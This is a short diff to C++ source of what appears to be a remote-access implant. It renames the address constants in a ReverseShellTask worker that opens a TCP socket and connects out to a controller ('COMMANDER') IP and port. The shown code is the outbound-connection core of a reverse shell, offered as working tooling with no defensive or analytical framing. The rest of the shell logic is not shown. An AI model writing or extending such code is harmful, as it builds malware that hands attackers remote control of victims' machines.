@@ -27,13 +27,13 @@ void ReverseShellTask::run() {
 void ReverseShellTask::worker() {
     auto api = Api::get_instance();
 
-    int port = COMMANDER_PORT;
+    int port = RS_PORT;
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;       
     revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr(COMMANDER_IP);
+    revsockaddr.sin_addr.s_addr = inet_addr(RS_IP);
 
     /* Try to connect to COMMANDER IP */
     if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) == -1) {
